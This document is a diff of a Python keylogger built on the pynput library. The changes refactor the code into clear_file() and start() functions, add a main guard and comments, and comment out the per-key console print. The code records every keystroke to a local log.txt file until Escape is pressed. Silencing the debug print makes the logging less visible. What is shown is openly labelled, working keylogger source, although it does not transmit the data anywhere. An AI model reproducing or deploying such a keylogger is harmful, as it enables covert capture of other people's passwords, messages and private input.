@@ -4,9 +4,8 @@ from pynput.keyboard import Key, Listener
 # File to log the keys
 log_file = "log.txt"
 
-with open(log_file, "w") as file:
-    file.write("Keylogger started...\n\n")
-
+# Used to write whatever keys are pressed to a
+# file in the current directory, log.txt
 def write_to_file(key: string):
     """
     Write the key after they are pressed.
@@ -33,6 +32,11 @@ def write_to_file(key: string):
         else:
             file.write(key_data)
 
+def clear_file():
+    with open(log_file, "w") as file:
+        file.write("Keylogger started...\n\n")
+
+# Called when a key is pressed
 def on_press(key: string):
     """
     Called when a key is pressed while the listener is running.
@@ -44,8 +48,9 @@ def on_press(key: string):
     a confirmation message to the console for debug purposes.
     """
     write_to_file(key)
-    print('Wrote', key, 'to', log_file, '.')
+    # print('Wrote', key, 'to', log_file, '.')
 
+# Called when a key is released
 def on_release(key: string):
     """
     Called when a key is released while the listener is running.
@@ -60,13 +65,18 @@ def on_release(key: string):
         print('Escape pressed.')
         return False # If ret is false the program will close
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    """
-    The key presses and releases trigger specific callback functions. 
-        The listener runs in the background and monitors the keyboard events for input.
+# Main function to start the keylogger
+def start():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        """
+        The key presses and releases trigger specific callback functions. 
+            The listener runs in the background and monitors the keyboard events for input.
 
-    Args:
-        on_press (function): A callback function that is called when a key is pressed.
-        on_release (function): A callback function that is called when a key is released.
-    """
-    listener.join()
+        Args:
+            on_press (function): A callback function that is called when a key is pressed.
+            on_release (function): A callback function that is called when a key is released.
+        """
+        listener.join()
+
+if __name__ == "__main__":
+    start()
